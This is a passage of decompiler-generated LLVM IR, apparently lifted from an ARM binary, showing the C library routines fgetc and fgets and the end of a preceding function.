  %stack_var_-8 = alloca i32, align 4
  %v3_16428 = load i32, i32* @r4, align 4
  store i32 %v3_16428, i32* %stack_var_-8, align 4
  %v1_1642c = add i32 %arg1, 8
  %v2_1642c = inttoptr i32 %v1_1642c to i32*
  %v3_1642c = load i32, i32* %v2_1642c, align 4
  store i32 %v3_1642c, i32* @r1, align 4
  %v1_16430 = add i32 %arg1, 16
  %v2_16430 = inttoptr i32 %v1_16430 to i32*
  %v3_16430 = load i32, i32* %v2_16430, align 4
  %v9_16434 = icmp eq i32 %v3_16430, %v3_1642c
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_16434, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_1642c, i32* %v2_16430, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_16440 = xor i1 %v9_16434, true
  call void @__pseudo_cond_branch(i1 %v1_16440, i32 ptrtoint (i32* @global_var_17e18.616 to i32))
  %v0_16444 = load i32, i32* %r4.global-to-local, align 4
  %v1_16444 = add i32 %v0_16444, 8
  %v2_16444 = inttoptr i32 %v1_16444 to i32*
  %v3_16444 = load i32, i32* %v2_16444, align 4
  %v1_16448 = add i32 %v0_16444, 16
  %v2_16448 = inttoptr i32 %v1_16448 to i32*
  %v3_16448 = load i32, i32* %v2_16448, align 4
  %v2_1644c = sub i32 %v3_16448, %v3_16444
  %v2_16450 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16450, i32* @r4, align 4
  ret i32 %v2_1644c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16458 = load i32, i32* @r4, align 4
  store i32 %v3_16458, i32* %stack_var_-20, align 4
  %v6_16458 = load i32, i32* @r5, align 4
  %v9_16458 = load i32, i32* @r6, align 4
  %v12_16458 = load i32, i32* @r7, align 4
  %v15_16458 = load i32, i32* @lr, align 4
  %v1_1645c = add i32 %arg1, 52
  %v2_1645c = inttoptr i32 %v1_1645c to i32*
  %v3_1645c = load i32, i32* %v2_1645c, align 4
  store i32 %v3_1645c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16460 = icmp eq i32 %v3_1645c, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_16460, label %dec_label_pc_16494, label %dec_label_pc_16470

dec_label_pc_16470:                               ; preds = %entry
  %v1_16470 = add i32 %arg1, 16
  %v2_16470 = inttoptr i32 %v1_16470 to i32*
  %v3_16470 = load i32, i32* %v2_16470, align 4
  store i32 %v3_16470, i32* %r2.global-to-local, align 4
  %v1_16474 = add i32 %arg1, 24
  %v2_16474 = inttoptr i32 %v1_16474 to i32*
  %v3_16474 = load i32, i32* %v2_16474, align 4
  store i32 %v3_16474, i32* %r3.global-to-local, align 4
  %v3_16478 = icmp uge i32 %v3_16470, %v3_16474
  store i1 %v3_16478, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_16478, label %dec_label_pc_16488, label %.thread

.thread:                                          ; preds = %dec_label_pc_16470
  %v2_1647c = inttoptr i32 %v3_16470 to i8*
  %v3_1647c = load i8, i8* %v2_1647c, align 1
  %v4_1647c = zext i8 %v3_1647c to i32
  store i32 %v4_1647c, i32* %r5.global-to-local, align 4
  %v6_1647c = add i32 %v3_16470, 1
  store i32 %v6_1647c, i32* %r2.global-to-local, align 4
  store i32 %v6_1647c, i32* %v2_16470, align 4
  br label %dec_label_pc_1658c

dec_label_pc_16488:                               ; preds = %dec_label_pc_16470
  %v1_16488 = inttoptr i32 %arg1 to i16*
  %v2_16488 = call i32 @getc_unlocked(i16* %v1_16488)
  store i32 %v2_16488, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1658c

dec_label_pc_16494:                               ; preds = %entry
  %v0_16494 = call i32 @__aeabi_read_tp()
  %v0_16498 = load i32, i32* @r7, align 4
  %v1_16498 = add i32 %v0_16498, 64
  %v2_16498 = inttoptr i32 %v1_16498 to i32*
  %v3_16498 = load i32, i32* %v2_16498, align 4
  store i32 %v3_16498, i32* %r3.global-to-local, align 4
  %v1_1649c = add i32 %v0_16494, -1168
  store i32 %v1_1649c, i32* @r6, align 4
  %v3_164a0 = icmp uge i32 %v3_16498, %v1_1649c
  store i1 %v3_164a0, i1* %cpsr_c.global-to-local, align 1
  %v9_164a0 = icmp eq i32 %v3_16498, %v1_1649c
  br i1 %v9_164a0, label %dec_label_pc_164e8, label %dec_label_pc_164a8

dec_label_pc_164a8:                               ; preds = %dec_label_pc_16494
  %v1_164a8 = add i32 %v0_16498, 56
  store i32 %v1_164a8, i32* @r5, align 4
  store i32 %v1_164a8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_164b4

dec_label_pc_164b4:                               ; preds = %dec_label_pc_164c0.dec_label_pc_164b4_crit_edge, %dec_label_pc_164a8
  %v0_164b4 = phi i32 [ %v0_164b4.pre, %dec_label_pc_164c0.dec_label_pc_164b4_crit_edge ], [ %v1_164a8, %dec_label_pc_164a8 ]
  %v1_164b4 = inttoptr i32 %v0_164b4 to i32*
  %v2_164b4 = load i32, i32* %v1_164b4, align 4
  store i32 %v2_164b4, i32* %r3.global-to-local, align 4
  %v1_164b8 = load i32, i32* @r4, align 4
  %v3_164b8 = icmp uge i32 %v2_164b4, %v1_164b8
  store i1 %v3_164b8, i1* %cpsr_c.global-to-local, align 1
  %v9_164b8 = icmp eq i32 %v2_164b4, %v1_164b8
  br i1 %v9_164b8, label %dec_label_pc_164c0, label %dec_label_pc_164d8

dec_label_pc_164c0:                               ; preds = %dec_label_pc_164b4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_164d0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_164d0, label %dec_label_pc_164d4, label %dec_label_pc_164c0.dec_label_pc_164b4_crit_edge

dec_label_pc_164c0.dec_label_pc_164b4_crit_edge:  ; preds = %dec_label_pc_164c0
  %v0_164b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_164b4

dec_label_pc_164d4:                               ; preds = %dec_label_pc_164c0
  %v0_164d4 = load i32, i32* @r4, align 4
  store i32 %v0_164d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_164d8

dec_label_pc_164d8:                               ; preds = %dec_label_pc_164b4, %dec_label_pc_164d4
  %v0_164d8 = phi i32 [ %v0_164d4, %dec_label_pc_164d4 ], [ %v2_164b4, %dec_label_pc_164b4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_164d8 = icmp eq i32 %v0_164d8, 0
  br i1 %v2_164d8, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_164d8
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_164d8, %bb
  store i32 91364, i32* @lr, align 4
  %v1_164e0 = xor i1 %v2_164d8, true
  call void @__pseudo_cond_branch(i1 %v1_164e0, i32 ptrtoint (i32* @global_var_142c4.496 to i32))
  %v0_164e4 = load i32, i32* @r6, align 4
  %v1_164e4 = load i32, i32* @r7, align 4
  %v2_164e4 = add i32 %v1_164e4, 64
  %v3_164e4 = inttoptr i32 %v2_164e4 to i32*
  store i32 %v0_164e4, i32* %v3_164e4, align 4
  %v0_164e8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_164e8

dec_label_pc_164e8:                               ; preds = %dec_label_pc_16494, %bb18
  %v1_164f8 = phi i32 [ %v0_16498, %dec_label_pc_16494 ], [ %v0_164e8.pre, %bb18 ]
  %v1_164e8 = add i32 %v1_164f8, 60
  %v2_164e8 = inttoptr i32 %v1_164e8 to i32*
  %v3_164e8 = load i32, i32* %v2_164e8, align 4
  store i32 %v3_164e8, i32* %r2.global-to-local, align 4
  %v1_164ec = add i32 %v1_164f8, 16
  %v2_164ec = inttoptr i32 %v1_164ec to i32*
  %v3_164ec = load i32, i32* %v2_164ec, align 4
  store i32 %v3_164ec, i32* @r1, align 4
  %v1_164f0 = add i32 %v1_164f8, 24
  %v2_164f0 = inttoptr i32 %v1_164f0 to i32*
  %v3_164f0 = load i32, i32* %v2_164f0, align 4
  store i32 %v3_164f0, i32* %r3.global-to-local, align 4
  %v1_164f4 = add i32 %v3_164e8, 1
  store i32 %v1_164f4, i32* %r2.global-to-local, align 4
  store i32 %v1_164f4, i32* %v2_164e8, align 4
  %v0_164fc = load i32, i32* @r1, align 4
  %v1_164fc = load i32, i32* %r3.global-to-local, align 4
  %v3_164fc = icmp uge i32 %v0_164fc, %v1_164fc
  store i1 %v3_164fc, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_164fc, label %dec_label_pc_1650c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_164e8
  %v2_16500 = inttoptr i32 %v0_164fc to i8*
  %v3_16500 = load i8, i8* %v2_16500, align 1
  %v4_16500 = zext i8 %v3_16500 to i32
  store i32 %v4_16500, i32* %r5.global-to-local, align 4
  %v6_16500 = add i32 %v0_164fc, 1
  store i32 %v6_16500, i32* @r1, align 4
  %v2_16504 = load i32, i32* @r7, align 4
  %v3_16504 = add i32 %v2_16504, 16
  %v4_16504 = inttoptr i32 %v3_16504 to i32*
  store i32 %v6_16500, i32* %v4_16504, align 4
  br label %dec_label_pc_16518

dec_label_pc_1650c:                               ; preds = %dec_label_pc_164e8
  %v0_1650c = load i32, i32* @r7, align 4
  %v1_16510 = inttoptr i32 %v0_1650c to i16*
  %v2_16510 = call i32 @getc_unlocked(i16* %v1_16510)
  store i32 %v2_16510, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16518

dec_label_pc_16518:                               ; preds = %.thread2, %dec_label_pc_1650c
  %v0_16518 = load i32, i32* @r7, align 4
  %v1_16518 = add i32 %v0_16518, 60
  %v2_16518 = inttoptr i32 %v1_16518 to i32*
  %v3_16518 = load i32, i32* %v2_16518, align 4
  %v1_1651c = add i32 %v3_16518, -1
  store i32 %v1_1651c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16520 = icmp eq i32 %v1_1651c, 0
  store i32 %v1_1651c, i32* %v2_16518, align 4
  br i1 %v2_16520, label %dec_label_pc_1652c, label %dec_label_pc_1658c

dec_label_pc_1652c:                               ; preds = %dec_label_pc_16518
  %v0_1652c = load i32, i32* %r3.global-to-local, align 4
  %v1_1652c = load i32, i32* @r7, align 4
  %v2_1652c = add i32 %v1_1652c, 64
  %v3_1652c = inttoptr i32 %v2_1652c to i32*
  store i32 %v0_1652c, i32* %v3_1652c, align 4
  %v0_16530 = load i32, i32* @r7, align 4
  %v1_16530 = add i32 %v0_16530, 56
  store i32 %v1_16530, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16534

dec_label_pc_16534:                               ; preds = %dec_label_pc_16564.dec_label_pc_16534_crit_edge, %dec_label_pc_1652c
  %v0_1653c = phi i32 [ %v0_1653c.pre, %dec_label_pc_16564.dec_label_pc_16534_crit_edge ], [ %v1_16530, %dec_label_pc_1652c ]
  %v0_16534 = phi i32 [ %v0_16534.pre, %dec_label_pc_16564.dec_label_pc_16534_crit_edge ], [ %v0_16530, %dec_label_pc_1652c ]
  %v1_16534 = add i32 %v0_16534, 56
  %v2_16534 = inttoptr i32 %v1_16534 to i32*
  %v3_16534 = load i32, i32* %v2_16534, align 4
  store i32 %v3_16534, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1653c, i32* %r2.global-to-local, align 4
  %v1_1654022 = inttoptr i32 %v0_1653c to i32*
  %v2_1654023 = load i32, i32* %v1_1654022, align 4
  store i32 %v2_1654023, i32* %r3.global-to-local, align 4
  %v3_1654425 = icmp uge i32 %v2_1654023, %v3_16534
  store i1 %v3_1654425, i1* %cpsr_c.global-to-local, align 1
  %v9_1654431 = icmp eq i32 %v2_1654023, %v3_16534
  br i1 %v9_1654431, label %dec_label_pc_1654c, label %dec_label_pc_16564

dec_label_pc_1654c:                               ; preds = %dec_label_pc_16534, %dec_label_pc_1654c.dec_label_pc_16540_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1655c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1655c, label %dec_label_pc_16560, label %dec_label_pc_1654c.dec_label_pc_16540_crit_edge

dec_label_pc_1654c.dec_label_pc_16540_crit_edge:  ; preds = %dec_label_pc_1654c
  %v0_16540.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16544.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16540 = inttoptr i32 %v0_16540.pre to i32*
  %v2_16540 = load i32, i32* %v1_16540, align 4
  store i32 %v2_16540, i32* %r3.global-to-local, align 4
  %v3_16544 = icmp uge i32 %v2_16540, %v1_16544.pre
  store i1 %v3_16544, i1* %cpsr_c.global-to-local, align 1
  %v9_16544 = icmp eq i32 %v2_16540, %v1_16544.pre
  br i1 %v9_16544, label %dec_label_pc_1654c, label %dec_label_pc_16564

dec_label_pc_16560:                               ; preds = %dec_label_pc_1654c
  %v0_16560 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16560, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16564

dec_label_pc_16564:                               ; preds = %dec_label_pc_16534, %dec_label_pc_1654c.dec_label_pc_16540_crit_edge, %dec_label_pc_16560
  %v0_1656c = phi i32 [ %v0_16560, %dec_label_pc_16560 ], [ %v2_1654023, %dec_label_pc_16534 ], [ %v2_16540, %dec_label_pc_1654c.dec_label_pc_16540_crit_edge ]
  %v1_16564 = phi i32 [ %v0_16560, %dec_label_pc_16560 ], [ %v3_16534, %dec_label_pc_16534 ], [ %v1_16544.pre, %dec_label_pc_1654c.dec_label_pc_16540_crit_edge ]
  %v3_16564 = icmp uge i32 %v0_1656c, %v1_16564
  store i1 %v3_16564, i1* %cpsr_c.global-to-local, align 1
  %v9_16564 = icmp eq i32 %v0_1656c, %v1_16564
  br i1 %v9_16564, label %dec_label_pc_1656c, label %dec_label_pc_16564.dec_label_pc_16534_crit_edge

dec_label_pc_16564.dec_label_pc_16534_crit_edge:  ; preds = %dec_label_pc_16564
  %v0_16534.pre = load i32, i32* @r7, align 4
  %v0_1653c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16534

dec_label_pc_1656c:                               ; preds = %dec_label_pc_16564
  %v2_1656c = icmp ne i32 %v1_16564, 0
  store i1 %v2_1656c, i1* %cpsr_c.global-to-local, align 1
  %v7_16570 = icmp slt i32 %v1_16564, 2
  br i1 %v7_16570, label %dec_label_pc_1658c, label %dec_label_pc_16574

dec_label_pc_16574:                               ; preds = %dec_label_pc_1656c
  %v0_16578 = load i32, i32* @r1, align 4
  %v1_16578 = add i32 %v0_16578, 129
  store i32 %v1_16578, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1658c

dec_label_pc_1658c:                               ; preds = %.thread, %dec_label_pc_16518, %dec_label_pc_16574, %dec_label_pc_1656c, %dec_label_pc_16488
  %v0_1658c = load i32, i32* %r5.global-to-local, align 4
  %v2_16594 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16594, i32* @r4, align 4
  store i32 %v6_16458, i32* @r5, align 4
  store i32 %v9_16458, i32* @r6, align 4
  store i32 %v12_16458, i32* @r7, align 4
  store i32 %v15_16458, i32* @lr, align 4
  ret i32 %v0_1658c

; uselistorder directives
  uselistorder i32 %v0_16560, { 1, 0, 2 }
  uselistorder i32 %v1_16544.pre, { 0, 2, 1 }
  uselistorder i32 %v0_164fc, { 1, 0, 2 }
  uselistorder i32 %v1_164f8, { 0, 2, 1 }
  uselistorder i32 %v1_164b8, { 1, 0 }
  uselistorder i32 %v3_16470, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1658c, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_16564, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1654c, { 1, 0 }
  uselistorder label %dec_label_pc_16518, { 1, 0 }
  uselistorder label %dec_label_pc_164e8, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_164d8, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1659c = load i32, i32* @r4, align 4
  store i32 %v3_1659c, i32* %stack_var_-32, align 4
  %v6_1659c = load i32, i32* @r5, align 4
  %v9_1659c = load i32, i32* @r6, align 4
  %v12_1659c = load i32, i32* @r7, align 4
  %v15_1659c = load i32, i32* @r8, align 4
  %v24_1659c = load i32, i32* @lr, align 4
  %v1_165a0 = add i32 %arg3, 52
  %v2_165a0 = inttoptr i32 %v1_165a0 to i32*
  %v3_165a0 = load i32, i32* %v2_165a0, align 4
  store i32 %v3_165a0, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_165a4 = icmp eq i32 %v3_165a0, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_165a4, label %dec_label_pc_165b8, label %dec_label_pc_1661c

dec_label_pc_165b8:                               ; preds = %entry
  %v0_165b8 = call i32 @__aeabi_read_tp()
  %v1_165bc = add i32 %arg3, 64
  %v2_165bc = inttoptr i32 %v1_165bc to i32*
  %v3_165bc = load i32, i32* %v2_165bc, align 4
  store i32 %v3_165bc, i32* %r3.global-to-local, align 4
  %v1_165c0 = add i32 %v0_165b8, -1168
  store i32 %v1_165c0, i32* @r8, align 4
  %v3_165c4 = icmp uge i32 %v3_165bc, %v1_165c0
  store i1 %v3_165c4, i1* %cpsr_c.global-to-local, align 1
  %v9_165c4 = icmp eq i32 %v3_165bc, %v1_165c0
  br i1 %v9_165c4, label %dec_label_pc_16610, label %dec_label_pc_165cc

dec_label_pc_165cc:                               ; preds = %dec_label_pc_165b8
  %v1_165cc = add i32 %arg3, 56
  store i32 %v1_165cc, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_165cc, i32* %r2.global-to-local, align 4
  %v0_165d8 = load i32, i32* @r6, align 4
  store i32 %v0_165d8, i32* @r4, align 4
  %v1_165dc36 = inttoptr i32 %v1_165cc to i32*
  %v2_165dc37 = load i32, i32* %v1_165dc36, align 4
  store i32 %v2_165dc37, i32* %r3.global-to-local, align 4
  %v3_165e039 = icmp uge i32 %v2_165dc37, %v0_165d8
  store i1 %v3_165e039, i1* %cpsr_c.global-to-local, align 1
  %v9_165e045 = icmp eq i32 %v2_165dc37, %v0_165d8
  br i1 %v9_165e045, label %dec_label_pc_165e8, label %dec_label_pc_16600

dec_label_pc_165e8:                               ; preds = %dec_label_pc_165cc, %dec_label_pc_165e8.dec_label_pc_165dc_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_165f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_165f8, label %dec_label_pc_165fc, label %dec_label_pc_165e8.dec_label_pc_165dc_crit_edge

dec_label_pc_165e8.dec_label_pc_165dc_crit_edge:  ; preds = %dec_label_pc_165e8
  %v0_165dc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_165e0.pre = load i32, i32* @r4, align 4
  %v1_165dc = inttoptr i32 %v0_165dc.pre to i32*
  %v2_165dc = load i32, i32* %v1_165dc, align 4
  store i32 %v2_165dc, i32* %r3.global-to-local, align 4
  %v3_165e0 = icmp uge i32 %v2_165dc, %v1_165e0.pre
  store i1 %v3_165e0, i1* %cpsr_c.global-to-local, align 1
  %v9_165e0 = icmp eq i32 %v2_165dc, %v1_165e0.pre
  br i1 %v9_165e0, label %dec_label_pc_165e8, label %dec_label_pc_16600

dec_label_pc_165fc:                               ; preds = %dec_label_pc_165e8
  %v0_165fc = load i32, i32* @r4, align 4
  store i32 %v0_165fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16600

dec_label_pc_16600:                               ; preds = %dec_label_pc_165cc, %dec_label_pc_165e8.dec_label_pc_165dc_crit_edge, %dec_label_pc_165fc
  %v0_16600 = phi i32 [ %v0_165fc, %dec_label_pc_165fc ], [ %v2_165dc37, %dec_label_pc_165cc ], [ %v2_165dc, %dec_label_pc_165e8.dec_label_pc_165dc_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16600 = icmp eq i32 %v0_16600, 0
  br i1 %v2_16600, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_16600
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_16600, %bb
  store i32 91660, i32* @lr, align 4
  %v1_16608 = xor i1 %v2_16600, true
  call void @__pseudo_cond_branch(i1 %v1_16608, i32 ptrtoint (i32* @global_var_142c4.496 to i32))
  %v0_1660c = load i32, i32* @r8, align 4
  %v1_1660c = load i32, i32* @r7, align 4
  %v2_1660c = add i32 %v1_1660c, 64
  %v3_1660c = inttoptr i32 %v2_1660c to i32*
  store i32 %v0_1660c, i32* %v3_1660c, align 4
  br label %dec_label_pc_16610

dec_label_pc_16610:                               ; preds = %dec_label_pc_165b8, %bb20
  %v0_16610 = load i32, i32* @r7, align 4
  %v1_16610 = add i32 %v0_16610, 60
  %v2_16610 = inttoptr i32 %v1_16610 to i32*
  %v3_16610 = load i32, i32* %v2_16610, align 4
  %v1_16614 = add i32 %v3_16610, 1
  store i32 %v1_16614, i32* %r3.global-to-local, align 4
  store i32 %v1_16614, i32* %v2_16610, align 4
  %v0_1661c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_16620.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_16624.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1661c

dec_label_pc_1661c:                               ; preds = %entry, %dec_label_pc_16610
  %v0_16624 = phi i32 [ %arg3, %entry ], [ %v0_16624.pre, %dec_label_pc_16610 ]
  %v0_16620 = phi i32 [ %arg2, %entry ], [ %v0_16620.pre, %dec_label_pc_16610 ]
  %v0_1661c = phi i32 [ %arg1, %entry ], [ %v0_1661c.pre, %dec_label_pc_16610 ]
  store i32 %v0_16620, i32* %r1.global-to-local, align 4
  store i32 %v0_16624, i32* %r2.global-to-local, align 4
  %v3_16628 = inttoptr i32 %v0_1661c to i8*
  %v4_16628 = call i32 @__GI_fgets_unlocked(i8* %v3_16628, i32 %v0_16620, i32 %v0_16624)
  %v0_1662c = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1662c = icmp eq i32 %v0_1662c, 0
  store i32 %v4_16628, i32* %r8.global-to-local, align 4
  br i1 %v2_1662c, label %dec_label_pc_16638, label %dec_label_pc_166ac

dec_label_pc_16638:                               ; preds = %dec_label_pc_1661c
  %v0_16638 = load i32, i32* @r7, align 4
  %v1_16638 = add i32 %v0_16638, 60
  %v2_16638 = inttoptr i32 %v1_16638 to i32*
  %v3_16638 = load i32, i32* %v2_16638, align 4
  %v1_1663c = add i32 %v3_16638, -1
  store i32 %v1_1663c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16640 = icmp eq i32 %v1_1663c, 0
  store i32 %v1_1663c, i32* %v2_16638, align 4
  br i1 %v2_16640, label %dec_label_pc_1664c, label %dec_label_pc_166ac

dec_label_pc_1664c:                               ; preds = %dec_label_pc_16638
  %v0_1664c = load i32, i32* %r3.global-to-local, align 4
  %v1_1664c = load i32, i32* @r7, align 4
  %v2_1664c = add i32 %v1_1664c, 64
  %v3_1664c = inttoptr i32 %v2_1664c to i32*
  store i32 %v0_1664c, i32* %v3_1664c, align 4
  %v0_16650 = load i32, i32* @r7, align 4
  %v1_16650 = add i32 %v0_16650, 56
  store i32 %v1_16650, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16654

dec_label_pc_16654:                               ; preds = %dec_label_pc_16684.dec_label_pc_16654_crit_edge, %dec_label_pc_1664c
  %v0_1665c = phi i32 [ %v0_1665c.pre, %dec_label_pc_16684.dec_label_pc_16654_crit_edge ], [ %v1_16650, %dec_label_pc_1664c ]
  %v0_16654 = phi i32 [ %v0_16654.pre, %dec_label_pc_16684.dec_label_pc_16654_crit_edge ], [ %v0_16650, %dec_label_pc_1664c ]
  %v1_16654 = add i32 %v0_16654, 56
  %v2_16654 = inttoptr i32 %v1_16654 to i32*
  %v3_16654 = load i32, i32* %v2_16654, align 4
  store i32 %v3_16654, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1665c, i32* %r2.global-to-local, align 4
  %v1_1666024 = inttoptr i32 %v0_1665c to i32*
  %v2_1666025 = load i32, i32* %v1_1666024, align 4
  store i32 %v2_1666025, i32* %r3.global-to-local, align 4
  %v3_1666427 = icmp uge i32 %v2_1666025, %v3_16654
  store i1 %v3_1666427, i1* %cpsr_c.global-to-local, align 1
  %v9_1666433 = icmp eq i32 %v2_1666025, %v3_16654
  br i1 %v9_1666433, label %dec_label_pc_1666c, label %dec_label_pc_16684

dec_label_pc_1666c:                               ; preds = %dec_label_pc_16654, %dec_label_pc_1666c.dec_label_pc_16660_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1667c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1667c, label %dec_label_pc_16680, label %dec_label_pc_1666c.dec_label_pc_16660_crit_edge

dec_label_pc_1666c.dec_label_pc_16660_crit_edge:  ; preds = %dec_label_pc_1666c
  %v0_16660.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16664.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16660 = inttoptr i32 %v0_16660.pre to i32*
  %v2_16660 = load i32, i32* %v1_16660, align 4
  store i32 %v2_16660, i32* %r3.global-to-local, align 4
  %v3_16664 = icmp uge i32 %v2_16660, %v1_16664.pre
  store i1 %v3_16664, i1* %cpsr_c.global-to-local, align 1
  %v9_16664 = icmp eq i32 %v2_16660, %v1_16664.pre
  br i1 %v9_16664, label %dec_label_pc_1666c, label %dec_label_pc_16684

dec_label_pc_16680:                               ; preds = %dec_label_pc_1666c
  %v0_16680 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16680, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16684

dec_label_pc_16684:                               ; preds = %dec_label_pc_16654, %dec_label_pc_1666c.dec_label_pc_16660_crit_edge, %dec_label_pc_16680
  %v0_1668c = phi i32 [ %v0_16680, %dec_label_pc_16680 ], [ %v2_1666025, %dec_label_pc_16654 ], [ %v2_16660, %dec_label_pc_1666c.dec_label_pc_16660_crit_edge ]
  %v1_16684 = phi i32 [ %v0_16680, %dec_label_pc_16680 ], [ %v3_16654, %dec_label_pc_16654 ], [ %v1_16664.pre, %dec_label_pc_1666c.dec_label_pc_16660_crit_edge ]
  %v3_16684 = icmp uge i32 %v0_1668c, %v1_16684
  store i1 %v3_16684, i1* %cpsr_c.global-to-local, align 1
  %v9_16684 = icmp eq i32 %v0_1668c, %v1_16684
  br i1 %v9_16684, label %dec_label_pc_1668c, label %dec_label_pc_16684.dec_label_pc_16654_crit_edge

dec_label_pc_16684.dec_label_pc_16654_crit_edge:  ; preds = %dec_label_pc_16684
  %v0_16654.pre = load i32, i32* @r7, align 4
  %v0_1665c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16654

dec_label_pc_1668c:                               ; preds = %dec_label_pc_16684
  %v2_1668c = icmp ne i32 %v1_16684, 0
  store i1 %v2_1668c, i1* %cpsr_c.global-to-local, align 1
  %v7_16690 = icmp slt i32 %v1_16684, 2
  br i1 %v7_16690, label %dec_label_pc_166ac, label %dec_label_pc_16694

dec_label_pc_16694:                               ; preds = %dec_label_pc_1668c
  %v0_16698 = load i32, i32* %r1.global-to-local, align 4
  %v1_16698 = add i32 %v0_16698, 129
  store i32 %v1_16698, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_166ac

dec_label_pc_166ac:                               ; preds = %dec_label_pc_16638, %dec_label_pc_1661c, %dec_label_pc_16694, %dec_label_pc_1668c
  %v0_166ac = load i32, i32* %r8.global-to-local, align 4
  %v2_166b0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_166b0, i32* %r4.global-to-local, align 4
